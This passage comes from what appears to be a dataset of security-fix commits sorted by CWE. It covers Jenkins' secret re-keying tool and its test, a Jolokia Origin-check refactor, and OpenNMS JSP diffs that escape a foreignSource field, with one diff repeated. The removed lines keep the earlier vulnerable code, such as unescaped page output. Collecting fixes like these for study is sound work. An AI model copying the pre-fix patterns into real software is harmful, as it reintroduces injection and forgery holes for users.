+ * @author Kohsuke Kawaguchi
+ */
+@Extension
+public class RekeySecretAdminMonitor extends AdministrativeMonitor implements StaplerProxy {
+
+    /**
+     * Whether we detected a need to run the rewrite program.
+     * Once we set it to true, we'll never turn it off.
+     *
+     * If the admin decides to dismiss this warning, we use {@link #isEnabled()} for that.
+     *
+     * In this way we can correctly differentiate all the different states.
+     */
+    private final FileBoolean needed = state("needed");
+
+    /**
+     * If the scanning process has run to the completion, we set to this true.
+     */
+    private final FileBoolean done = state("done");
+
+    /**
+     * If the rewrite process is scheduled upon the next boot.
+     */
+    private final FileBoolean scanOnBoot = state("scanOnBoot");
+
+    /**
+     * Set to non-null once the rewriting activities starts running.
+     */
+    private volatile RekeyThread rekeyThread;
+
+
+    public RekeySecretAdminMonitor() throws IOException {
+        // if JENKINS_HOME existed <1.497, we need to offer rewrite
+        // this computation needs to be done and the value be captured,
+        // since $JENKINS_HOME/config.xml can be saved later before the user has
+        // actually rewritten XML files.
+        if (Jenkins.getInstance().isUpgradedFromBefore(new VersionNumber("1.496.*")))
+            needed.on();
+    }
+
+    /**
+     * Requires ADMINISTER permission for any operation in here.
+     */
+    public Object getTarget() {
+        Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);
+        return this;
+    }
+
+    @Override
+    public boolean isActivated() {
+        return needed.isOn();
+    }
+
+    /**
+     * Indicates that the re-keying has run to the completion.
+     */
+    public boolean isDone() {
+        return done.isOn();
+    }
+
+    public void setNeeded() {
+        needed.on();
+    }
+
+    public boolean isScanOnBoot() {
+        return scanOnBoot.isOn();
+    }
+
+    @RequirePOST
+    public HttpResponse doScan(StaplerRequest req) throws IOException, GeneralSecurityException {
+        if(req.hasParameter("background")) {
+            synchronized (this) {
+                if (!isRewriterActive()) {
+                    rekeyThread = new RekeyThread();
+                    rekeyThread.start();
+                }
+            }
+        } else
+        if(req.hasParameter("schedule")) {
+            scanOnBoot.on();
+        } else
+        if(req.hasParameter("dismiss")) {
+            disable(true);
+        } else
+            throw HttpResponses.error(400,"Invalid request submission");
+
+        return HttpResponses.redirectViaContextPath("/manage");
+    }
+
+    /**
+     * Is there an active rewriting process going on?
+     */
+    public boolean isRewriterActive() {
+        return rekeyThread !=null && rekeyThread.isAlive();
+    }
+
+    /**
+     * Used to URL-bind {@link AnnotatedLargeText}.
+     */
+    public AnnotatedLargeText getLogText() {
+        return new AnnotatedLargeText<RekeySecretAdminMonitor>(getLogFile(), Charset.defaultCharset(),
+                !isRewriterActive(),this);
+    }
+
+    private static FileBoolean state(String name) {
+        return new FileBoolean(new File(getBaseDir(),name));
+    }
+
+    @Initializer(fatal=false,after=InitMilestone.PLUGINS_STARTED,before=InitMilestone.EXTENSIONS_AUGMENTED)
+    // as early as possible, but this needs to be late enough that the ConfidentialStore is available
+    public static void scanOnReboot() throws InterruptedException, IOException, GeneralSecurityException {
+        FileBoolean flag = new RekeySecretAdminMonitor().scanOnBoot;
+        if (flag.isOn()) {
+            flag.off();
+            RekeyThread t = new RekeyThread();
+            t.start();
+            t.join();
+            // block the boot until the rewrite process is complete
+            // don't let the failure in RekeyThread block Jenkins boot.
+        }
+    }
+
+    /**
+     * Rewrite log file.
+     */
+    public static File getLogFile() {
+        return new File(getBaseDir(),"rekey.log");
+    }
+
+    private static File getBaseDir() {
+        return new File(Jenkins.getInstance().getRootDir(),RekeySecretAdminMonitor.class.getName());
+    }
+
+    private static class RekeyThread extends Thread {
+        private final SecretRewriter rewriter;
+
+        RekeyThread() throws GeneralSecurityException {
+            super("Rekey secret thread");
+            rewriter = new SecretRewriter(new File(getBaseDir(),"backups"));
+        }
+
+        @Override
+        public void run() {
+            try {
+                LOGGER.info("Initiating a re-keying of secrets. See "+getLogFile());
+                StreamTaskListener listener = new StreamTaskListener(getLogFile());
+                try {
+                    PrintStream log = listener.getLogger();
+                    log.println("Started re-keying " + new Date());
+                    int count = rewriter.rewriteRecursive(Jenkins.getInstance().getRootDir(), listener);
+                    log.printf("Completed re-keying %d files on %s\n",count,new Date());
+                    new RekeySecretAdminMonitor().done.on();
+                    LOGGER.info("Secret re-keying completed");
+                } catch (Exception e) {
+                    LOGGER.log(Level.SEVERE, "Fatal failure in re-keying secrets",e);
+                    e.printStackTrace(listener.error("Fatal failure in rewriting secrets"));
+                }
+            } catch (IOException e) {
+                LOGGER.log(Level.SEVERE, "Catastrophic failure to rewrite secrets",e);
+            }
+        }
+    }
+
+    private static final Logger LOGGER = Logger.getLogger(RekeySecretAdminMonitor.class.getName());
+
+}

Code after:
package jenkins.security;

import hudson.Extension;
import hudson.console.AnnotatedLargeText;
import hudson.init.InitMilestone;
import hudson.init.Initializer;
import hudson.model.AdministrativeMonitor;
import hudson.util.HttpResponses;
import hudson.util.SecretRewriter;
import hudson.util.StreamTaskListener;
import hudson.util.VersionNumber;
import jenkins.model.Jenkins;
import jenkins.util.io.FileBoolean;
import org.kohsuke.stapler.HttpResponse;
import org.kohsuke.stapler.StaplerProxy;
import org.kohsuke.stapler.StaplerRequest;
import org.kohsuke.stapler.interceptor.RequirePOST;

import java.io.File;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.charset.Charset;
import java.security.GeneralSecurityException;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Warns the administrator to run {@link SecretRewriter}
 *
 * @author Kohsuke Kawaguchi
 */
@Extension
public class RekeySecretAdminMonitor extends AdministrativeMonitor implements StaplerProxy {

    /**
     * Whether we detected a need to run the rewrite program.
     * Once we set it to true, we'll never turn it off.
     *
     * If the admin decides to dismiss this warning, we use {@link #isEnabled()} for that.
     *
     * In this way we can correctly differentiate all the different states.
     */
    private final FileBoolean needed = state("needed");

    /**
     * If the scanning process has run to the completion, we set to this true.
     */
    private final FileBoolean done = state("done");

    /**
     * If the rewrite process is scheduled upon the next boot.
     */
    private final FileBoolean scanOnBoot = state("scanOnBoot");

    /**
     * Set to non-null once the rewriting activities starts running.
     */
    private volatile RekeyThread rekeyThread;


    public RekeySecretAdminMonitor() throws IOException {
        // if JENKINS_HOME existed <1.497, we need to offer rewrite
        // this computation needs to be done and the value be captured,
        // since $JENKINS_HOME/config.xml can be saved later before the user has
        // actually rewritten XML files.
        if (Jenkins.getInstance().isUpgradedFromBefore(new VersionNumber("1.496.*")))
            needed.on();
    }

    /**
     * Requires ADMINISTER permission for any operation in here.
     */
    public Object getTarget() {
        Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);
        return this;
    }

    @Override
    public boolean isActivated() {
        return needed.isOn();
    }

    /**
     * Indicates that the re-keying has run to the completion.
     */
    public boolean isDone() {
        return done.isOn();
    }

    public void setNeeded() {
        needed.on();
    }

    public boolean isScanOnBoot() {
        return scanOnBoot.isOn();
    }

    @RequirePOST
    public HttpResponse doScan(StaplerRequest req) throws IOException, GeneralSecurityException {
        if(req.hasParameter("background")) {
            synchronized (this) {
                if (!isRewriterActive()) {
                    rekeyThread = new RekeyThread();
                    rekeyThread.start();
                }
            }
        } else
        if(req.hasParameter("schedule")) {
            scanOnBoot.on();
        } else
        if(req.hasParameter("dismiss")) {
            disable(true);
        } else
            throw HttpResponses.error(400,"Invalid request submission");

        return HttpResponses.redirectViaContextPath("/manage");
    }

    /**
     * Is there an active rewriting process going on?
     */
    public boolean isRewriterActive() {
        return rekeyThread !=null && rekeyThread.isAlive();
    }

    /**
     * Used to URL-bind {@link AnnotatedLargeText}.
     */
    public AnnotatedLargeText getLogText() {
        return new AnnotatedLargeText<RekeySecretAdminMonitor>(getLogFile(), Charset.defaultCharset(),
                !isRewriterActive(),this);
    }

    private static FileBoolean state(String name) {
        return new FileBoolean(new File(getBaseDir(),name));
    }

    @Initializer(fatal=false,after=InitMilestone.PLUGINS_STARTED,before=InitMilestone.EXTENSIONS_AUGMENTED)
    // as early as possible, but this needs to be late enough that the ConfidentialStore is available
    public static void scanOnReboot() throws InterruptedException, IOException, GeneralSecurityException {
        FileBoolean flag = new RekeySecretAdminMonitor().scanOnBoot;
        if (flag.isOn()) {
            flag.off();
            RekeyThread t = new RekeyThread();
            t.start();
            t.join();
            // block the boot until the rewrite process is complete
            // don't let the failure in RekeyThread block Jenkins boot.
        }
    }

    /**
     * Rewrite log file.
     */
    public static File getLogFile() {
        return new File(getBaseDir(),"rekey.log");
    }

    private static File getBaseDir() {
        return new File(Jenkins.getInstance().getRootDir(),RekeySecretAdminMonitor.class.getName());
    }

    private static class RekeyThread extends Thread {
        private final SecretRewriter rewriter;

        RekeyThread() throws GeneralSecurityException {
            super("Rekey secret thread");
            rewriter = new SecretRewriter(new File(getBaseDir(),"backups"));
        }

        @Override
        public void run() {
            try {
                LOGGER.info("Initiating a re-keying of secrets. See "+getLogFile());
                StreamTaskListener listener = new StreamTaskListener(getLogFile());
                try {
                    PrintStream log = listener.getLogger();
                    log.println("Started re-keying " + new Date());
                    int count = rewriter.rewriteRecursive(Jenkins.getInstance().getRootDir(), listener);
                    log.printf("Completed re-keying %d files on %s\n",count,new Date());
                    new RekeySecretAdminMonitor().done.on();
                    LOGGER.info("Secret re-keying completed");
                } catch (Exception e) {
                    LOGGER.log(Level.SEVERE, "Fatal failure in re-keying secrets",e);
                    e.printStackTrace(listener.error("Fatal failure in rewriting secrets"));
                }
            } catch (IOException e) {
                LOGGER.log(Level.SEVERE, "Catastrophic failure to rewrite secrets",e);
            }
        }
    }

    private static final Logger LOGGER = Logger.getLogger(RekeySecretAdminMonitor.class.getName());

}


--------------------
Filename: SecretHelper.java
Message: [SECURITY-49] added a tool to re-key secrets

As an AdministrativeMonitor, it shows up in the manage Jenkins UI, and
allows the administrator to run a re-keying operation.

Diff: @@ -0,0 +1,10 @@
+package hudson.util;
+
+/**
+ * @author Kohsuke Kawaguchi
+ */
+public class SecretHelper {
+    public static void set(String s) {
+        Secret.SECRET = s;
+    }
+}

Code after:
package hudson.util;

/**
 * @author Kohsuke Kawaguchi
 */
public class SecretHelper {
    public static void set(String s) {
        Secret.SECRET = s;
    }
}


--------------------
Filename: RekeySecretAdminMonitorTest.java
Message: [SECURITY-49] added a tool to re-key secrets

As an AdministrativeMonitor, it shows up in the manage Jenkins UI, and
allows the administrator to run a re-keying operation.

Diff: @@ -0,0 +1,157 @@
+package jenkins.security;
+
+import com.gargoylesoftware.htmlunit.ElementNotFoundException;
+import com.gargoylesoftware.htmlunit.html.HtmlButton;
+import com.gargoylesoftware.htmlunit.html.HtmlForm;
+import com.gargoylesoftware.htmlunit.html.HtmlPage;
+import com.trilead.ssh2.crypto.Base64;
+import hudson.FilePath;
+import hudson.Util;
+import hudson.util.Secret;
+import hudson.util.SecretHelper;
+import org.apache.commons.io.FileUtils;
+import org.jvnet.hudson.test.HudsonTestCase;
+import org.jvnet.hudson.test.recipes.Recipe.Runner;
+import org.xml.sax.SAXException;
+
+import javax.crypto.Cipher;
+import javax.inject.Inject;
+import java.io.File;
+import java.io.IOException;
+import java.lang.annotation.Annotation;
+
+/**
+ * @author Kohsuke Kawaguchi
+ */
+public class RekeySecretAdminMonitorTest extends HudsonTestCase {
+    @Inject
+    RekeySecretAdminMonitor monitor;
+
+    @Override
+    protected void setUp() throws Exception {
+        SecretHelper.set(TEST_KEY);
+        super.setUp();
+        monitor.setNeeded();
+    }
+
+    @Override
+    protected void tearDown() throws Exception {
+        SecretHelper.set(null);
+        super.tearDown();
+    }
+
+    @Override
+    protected void recipe() throws Exception {
+        super.recipe();
+        recipes.add(new Runner() {
+            @Override
+            public void setup(HudsonTestCase testCase, Annotation recipe) throws Exception {
+            }
+
+            @Override
+            public void decorateHome(HudsonTestCase testCase, File home) throws Exception {
+                if (getName().endsWith("testScanOnBoot")) {
+                    // schedule a scan on boot
+                    File f = new File(home, RekeySecretAdminMonitor.class.getName() + "/scanOnBoot");
+                    f.getParentFile().mkdirs();
+                    new FilePath(f).touch(0);
+
+                    // and stage some data
+                    putSomeOldData(home);
+                }
+            }
+
+            @Override
+            public void tearDown(HudsonTestCase testCase, Annotation recipe) throws Exception {
+            }
+        });
+    }
+
+
+    private void putSomeOldData(File dir) throws Exception {
+        File xml = new File(dir, "foo.xml");
+        FileUtils.writeStringToFile(xml,"<foo>" + encryptOld(TEST_KEY) + "</foo>");
+    }
+
+    private void verifyRewrite(File dir) throws Exception {
+        File xml = new File(dir, "foo.xml");
+        assertEquals("<foo>" + encryptNew(TEST_KEY) + "</foo>".trim(),
+                FileUtils.readFileToString(xml).trim());
+    }
+
+    public void testBasicWorkflow() throws Exception {
+        putSomeOldData(jenkins.getRootDir());
+
+        WebClient wc = createWebClient();
+
+        // one should see the warning. try scheduling it
+        assertTrue(!monitor.isScanOnBoot());
+        HtmlForm form = getRekeyForm(wc);
+        submit(form, "schedule");
+        assertTrue(monitor.isScanOnBoot());
+        form = getRekeyForm(wc);
+        assertTrue(getButton(form, 1).isDisabled());
+
+        // run it now
+        assertTrue(!monitor.getLogFile().exists());
+        submit(form, "background");
+        assertTrue(monitor.getLogFile().exists());
+
+        // should be no warning/error now
+        HtmlPage manage = wc.goTo("/manage");
+        assertEquals(0,manage.selectNodes("//*[class='error']").size());
+        assertEquals(0,manage.selectNodes("//*[class='warning']").size());
+
+        // and the data should be rewritten
+        verifyRewrite(jenkins.getRootDir());
+        assertTrue(monitor.isDone());
+
+        // dismiss and the message will be gone
+        assertTrue(monitor.isEnabled());
+        form = getRekeyForm(wc);
+        submit(form, "dismiss");
+        assertFalse(monitor.isEnabled());
+        try {
+            getRekeyForm(wc);
+            fail();
+        } catch (ElementNotFoundException e) {
+            // expected
+        }
+    }
+
+    private HtmlForm getRekeyForm(WebClient wc) throws IOException, SAXException {
+        return wc.goTo("/manage").getFormByName("rekey");
+    }
+
+    private HtmlButton getButton(HtmlForm form, int index) {
+        return form.<HtmlButton>getHtmlElementsByTagName("button").get(index);
+    }
+
+    public void testScanOnBoot() throws Exception {
+        WebClient wc = createWebClient();
+
+        // scan on boot should have run the scan
+        assertTrue(monitor.getLogFile().exists());
+        assertTrue("scan on boot should have turned this off",!monitor.isScanOnBoot());
+
+        // and data should be migrated
+        verifyRewrite(jenkins.getRootDir());
+
+        // should be no warning/error now
+        HtmlPage manage = wc.goTo("/manage");
+        assertEquals(0,manage.selectNodes("//*[class='error']").size());
+        assertEquals(0,manage.selectNodes("//*[class='warning']").size());
+    }
+
+    private String encryptOld(String str) throws Exception {
+        Cipher cipher = Secret.getCipher("AES");
+        cipher.init(Cipher.ENCRYPT_MODE, Util.toAes128Key(TEST_KEY));
+        return new String(Base64.encode(cipher.doFinal((str + "::::MAGIC::::").getBytes("UTF-8"))));
+    }
+
+    private String encryptNew(String str) {
+        return Secret.fromString(str).getEncryptedValue();
+    }
+
+    private static final String TEST_KEY = "superDuperSecretWasNotSoSecretAfterAll";
+}

Code after:
package jenkins.security;

import com.gargoylesoftware.htmlunit.ElementNotFoundException;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.trilead.ssh2.crypto.Base64;
import hudson.FilePath;
import hudson.Util;
import hudson.util.Secret;
import hudson.util.SecretHelper;
import org.apache.commons.io.FileUtils;
import org.jvnet.hudson.test.HudsonTestCase;
import org.jvnet.hudson.test.recipes.Recipe.Runner;
import org.xml.sax.SAXException;

import javax.crypto.Cipher;
import javax.inject.Inject;
import java.io.File;
import java.io.IOException;
import java.lang.annotation.Annotation;

/**
 * @author Kohsuke Kawaguchi
 */
public class RekeySecretAdminMonitorTest extends HudsonTestCase {
    @Inject
    RekeySecretAdminMonitor monitor;

    @Override
    protected void setUp() throws Exception {
        SecretHelper.set(TEST_KEY);
        super.setUp();
        monitor.setNeeded();
    }

    @Override
    protected void tearDown() throws Exception {
        SecretHelper.set(null);
        super.tearDown();
    }

    @Override
    protected void recipe() throws Exception {
        super.recipe();
        recipes.add(new Runner() {
            @Override
            public void setup(HudsonTestCase testCase, Annotation recipe) throws Exception {
            }

            @Override
            public void decorateHome(HudsonTestCase testCase, File home) throws Exception {
                if (getName().endsWith("testScanOnBoot")) {
                    // schedule a scan on boot
                    File f = new File(home, RekeySecretAdminMonitor.class.getName() + "/scanOnBoot");
                    f.getParentFile().mkdirs();
                    new FilePath(f).touch(0);

                    // and stage some data
                    putSomeOldData(home);
                }
            }

            @Override
            public void tearDown(HudsonTestCase testCase, Annotation recipe) throws Exception {
            }
        });
    }


    private void putSomeOldData(File dir) throws Exception {
        File xml = new File(dir, "foo.xml");
        FileUtils.writeStringToFile(xml,"<foo>" + encryptOld(TEST_KEY) + "</foo>");
    }

    private void verifyRewrite(File dir) throws Exception {
        File xml = new File(dir, "foo.xml");
        assertEquals("<foo>" + encryptNew(TEST_KEY) + "</foo>".trim(),
                FileUtils.readFileToString(xml).trim());
    }

    public void testBasicWorkflow() throws Exception {
        putSomeOldData(jenkins.getRootDir());

        WebClient wc = createWebClient();

        // one should see the warning. try scheduling it
        assertTrue(!monitor.isScanOnBoot());
        HtmlForm form = getRekeyForm(wc);
        submit(form, "schedule");
        assertTrue(monitor.isScanOnBoot());
        form = getRekeyForm(wc);
        assertTrue(getButton(form, 1).isDisabled());

        // run it now
        assertTrue(!monitor.getLogFile().exists());
        submit(form, "background");
        assertTrue(monitor.getLogFile().exists());

        // should be no warning/error now
        HtmlPage manage = wc.goTo("/manage");
        assertEquals(0,manage.selectNodes("//*[class='error']").size());
        assertEquals(0,manage.selectNodes("//*[class='warning']").size());

        // and the data should be rewritten
        verifyRewrite(jenkins.getRootDir());
        assertTrue(monitor.isDone());

        // dismiss and the message will be gone
        assertTrue(monitor.isEnabled());
        form = getRekeyForm(wc);
        submit(form, "dismiss");
        assertFalse(monitor.isEnabled());
        try {
            getRekeyForm(wc);
            fail();
        } catch (ElementNotFoundException e) {
            // expected
        }
    }

    private HtmlForm getRekeyForm(WebClient wc) throws IOException, SAXException {
        return wc.goTo("/manage").getFormByName("rekey");
    }

    private HtmlButton getButton(HtmlForm form, int index) {
        return form.<HtmlButton>getHtmlElementsByTagName("button").get(index);
    }

    public void testScanOnBoot() throws Exception {
        WebClient wc = createWebClient();

        // scan on boot should have run the scan
        assertTrue(monitor.getLogFile().exists());
        assertTrue("scan on boot should have turned this off",!monitor.isScanOnBoot());

        // and data should be migrated
        verifyRewrite(jenkins.getRootDir());

        // should be no warning/error now
        HtmlPage manage = wc.goTo("/manage");
        assertEquals(0,manage.selectNodes("//*[class='error']").size());
        assertEquals(0,manage.selectNodes("//*[class='warning']").size());
    }

    private String encryptOld(String str) throws Exception {
        Cipher cipher = Secret.getCipher("AES");
        cipher.init(Cipher.ENCRYPT_MODE, Util.toAes128Key(TEST_KEY));
        return new String(Base64.encode(cipher.doFinal((str + "::::MAGIC::::").getBytes("UTF-8"))));
    }

    private String encryptNew(String str) {
        return Secret.fromString(str).getEncryptedValue();
    }

    private static final String TEST_KEY = "superDuperSecretWasNotSoSecretAfterAll";
}


--------------------

********************
CWE-352: Cross-Site Request Forgery (CSRF) (32 samples)
********************
Filename: AbstractConstantRestrictor.java
Message: Enchanced policy wr to origin handling. The Origin: can now be checked on the server side, too.

Diff: @@ -73,7 +73,7 @@ public abstract class AbstractConstantRestrictor implements Restrictor {
     }
 
     /** {@inheritDoc} */
-    public boolean isCorsAccessAllowed(String pOrigin) {
+    public boolean isOriginAllowed(String pOrigin, boolean pIsStrictCheck) {
         return isAllowed;
     }
 }

Code after:

    /** {@inheritDoc} */
    public final boolean isOperationAllowed(ObjectName pName, String pOperation) {
        return isAllowed;
    }

    /** {@inheritDoc} */
    public final boolean isRemoteAccessAllowed(String... pHostOrAddress) {
        return isAllowed;
    }

    /** {@inheritDoc} */
    public boolean isOriginAllowed(String pOrigin, boolean pIsStrictCheck) {
        return isAllowed;
    }
}


--------------------
Filename: PolicyRestrictor.java
Message: Enchanced policy wr to origin handling. The Origin: can now be checked on the server side, too.

Diff: @@ -99,8 +99,8 @@ public class PolicyRestrictor implements Restrictor {
     }
 
     /** {@inheritDoc} */
-    public boolean isCorsAccessAllowed(String pOrigin) {
-        return corsChecker.check(pOrigin);
+    public boolean isOriginAllowed(String pOrigin, boolean pIsStrictCheck) {
+        return corsChecker.check(pOrigin,pIsStrictCheck);
     }
 
     /** {@inheritDoc} */

Code after:

    /** {@inheritDoc} */
    public boolean isTypeAllowed(RequestType pType) {
        return requestTypeChecker.check(pType);
    }

    /** {@inheritDoc} */
    public boolean isRemoteAccessAllowed(String ... pHostOrAddress) {
        return networkChecker.check(pHostOrAddress);
    }

    /** {@inheritDoc} */
    public boolean isOriginAllowed(String pOrigin, boolean pIsStrictCheck) {
        return corsChecker.check(pOrigin,pIsStrictCheck);
    }

    /** {@inheritDoc} */
    public boolean isAttributeReadAllowed(ObjectName pName, String pAttribute) {
        return check(RequestType.READ,pName,pAttribute);
    }

    /** {@inheritDoc} */
    public boolean isAttributeWriteAllowed(ObjectName pName, String pAttribute) {
        return check(RequestType.WRITE,pName, pAttribute);
    }

    /** {@inheritDoc} */
    public boolean isOperationAllowed(ObjectName pName, String pOperation) {


--------------------
Filename: BackendManagerTest.java
Message: Enchanced policy wr to origin handling. The Origin: can now be checked on the server side, too.

Diff: @@ -150,7 +150,7 @@ public class BackendManagerTest {
     @Test
     public void corsAccessCheck() {
         BackendManager backendManager = new BackendManager(config,log);
-        assertTrue(backendManager.isCorsAccessAllowed("http://bla.com"));
+        assertTrue(backendManager.isOriginAllowed("http://bla.com",false));
         backendManager.destroy();
     }
 

Code after:
    }

    @Test
    public void remoteAccessCheck() {
        BackendManager backendManager = new BackendManager(config,log);
        assertTrue(backendManager.isRemoteAccessAllowed("localhost","127.0.0.1"));
        backendManager.destroy();
    }

    @Test
    public void corsAccessCheck() {
        BackendManager backendManager = new BackendManager(config,log);
        assertTrue(backendManager.isOriginAllowed("http://bla.com",false));
        backendManager.destroy();
    }

    @Test
    public void convertError() throws MalformedObjectNameException {
        BackendManager backendManager = new BackendManager(config,log);
        Exception exp = new IllegalArgumentException("Hans",new IllegalStateException("Kalb"));
        JmxRequest req = new JmxRequestBuilder(RequestType.READ,"java.lang:type=Memory").build();
        JSONObject jsonError = (JSONObject) backendManager.convertExceptionToJson(exp,req);
        assertTrue(!jsonError.containsKey("stackTrace"));
        assertEquals(jsonError.get("message"),"Hans");
        assertEquals(((JSONObject) jsonError.get("cause")).get("message"),"Kalb");
        backendManager.destroy();
    }


--------------------
Filename: node.jsp
Message: NMS-13231: Backport Security Issues from Last Month

Diff: @@ -310,7 +310,7 @@ function confirmAssetEdit() {
 
 <h5>
   <c:if test="${model.foreignSource != null}">
-    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${model.foreignSource}"><i class="fa fa-list-alt"></i>&nbsp;${model.foreignSource}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
+    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${fn:escapeXml(model.foreignSource)}"><i class="fa fa-list-alt"></i>&nbsp;${fn:escapeXml(model.foreignSource)}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
   </c:if>
   <c:if test="${model.foreignSource == null}">
     <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>

Code after:
<% } else { %>
    return true;
<% } %>
</c:if>
<c:if test="${model.foreignSource == null}">
  return true;
</c:if>
}
</script>

<h5>
  <c:if test="${model.foreignSource != null}">
    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${fn:escapeXml(model.foreignSource)}"><i class="fa fa-list-alt"></i>&nbsp;${fn:escapeXml(model.foreignSource)}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
  </c:if>
  <c:if test="${model.foreignSource == null}">
    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
  </c:if>
</h5>

  <ul class="list-inline">
    <c:url var="eventLink" value="event/list">
      <c:param name="filter" value="node=${model.id}"/>
    </c:url>
    <li class="list-inline-item">
      <a href="<c:out value="${eventLink}"/>">View Events</a>
    </li>



--------------------
Filename: node.jsp
Message: NMS-13231: Backport Security Issues from Last Month

Diff: @@ -310,7 +310,7 @@ function confirmAssetEdit() {
 
 <h5>
   <c:if test="${model.foreignSource != null}">
-    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${model.foreignSource}"><i class="fa fa-list-alt"></i>&nbsp;${model.foreignSource}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
+    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${fn:escapeXml(model.foreignSource)}"><i class="fa fa-list-alt"></i>&nbsp;${fn:escapeXml(model.foreignSource)}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
   </c:if>
   <c:if test="${model.foreignSource == null}">
     <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>

Code after:
<% } else { %>
    return true;
<% } %>
</c:if>
<c:if test="${model.foreignSource == null}">
  return true;
</c:if>
}
</script>

<h5>
  <c:if test="${model.foreignSource != null}">
